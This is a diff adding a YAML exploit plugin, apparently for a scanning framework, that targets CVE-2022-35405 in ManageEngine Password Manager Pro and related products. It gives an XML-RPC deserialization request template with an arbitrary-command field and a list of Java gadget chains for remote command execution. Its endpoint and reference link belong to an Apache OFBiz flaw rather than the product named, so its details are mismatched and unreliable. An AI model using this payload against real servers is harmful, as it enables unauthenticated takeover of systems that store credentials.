@@ -1,0 +1,85 @@
+info:
+    app: Zoho_Password_Manager_Pro
+    name: CVE-2022-35405
+    author: 小晨曦
+    plugin_version: 1.0.0
+    disclosure_date: "2022-08-03"
+    create_date: "2024-10-06 09:52:55"
+    update_date: "2024-10-06 09:52:55"
+    scope: |-
+        Access Manager Plus	4302及以下
+        Password Manager Pro	12100及以下
+        PAM360	5500及以下
+    description: 在 ManageEngine Password Manager Pro 和 PAM360 中未经身份验证的远程代码执行。\n在 ManageEngine Access Manager Plus 中经过身份验证的远程代码执行。
+    vul_id: CVE-2022-35405
+    payload: |-
+        POST /webtools/control/xmlrpc HTTP/1.1
+        Host: your-ip
+        Content-Type: application/xml
+        Content-Length: 4093
+
+        <?xml version="1.0"?>
+        <methodCall>
+          <methodName>ProjectDiscovery</methodName>
+          <params>
+            <param>
+              <value>
+                <struct>
+                  <member>
+                    <name>test</name>
+                    <value>
+                      <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">[base64-payload]</serializable>
+                    </value>
+                  </member>
+                </struct>
+              </value>
+            </param>
+          </params>
+        </methodCall>
+    reference: https://github.com/vulhub/vulhub/blob/master/ofbiz/CVE-2020-9496/README.zh-cn.md
+payloads:
+    - name: cmd1
+      alias: 检测漏洞
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: ""
+            required: true
+          - key: gadget
+            title: gadget
+            param_type: combobox
+            default_value:
+                - FindClassByDNS
+            required: true
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: ""
+            required: true
+          - key: gadget
+            title: gadget
+            param_type: combobox
+            default_value:
+                - CommonsBeanutilsNoCC1SpringEncodeEcho
+                - CommonsBeanutilsNoCC2SpringEncodeEcho
+                - CommonsBeanutilsNoCC1TomcatEncodeEcho
+                - CommonsBeanutilsNoCC2TomcatEncodeEcho
+                - CommonsCollectionsK1TomcatEncodeEcho
+                - CommonsCollectionsK2TomcatEncodeEcho
+            required: true
+    - name: cmd1
+      alias: sleep检测
+      params:
+          - key: gadget
+            title: gadget
+            param_type: combobox
+            default_value:
+                - CommonsBeanutilsNoCC1Sleep
+                - CommonsBeanutilsNoCC2Sleep
+                - CommonsCollectionsK1Sleep
+                - CommonsCollectionsK2Sleep
+            required: true
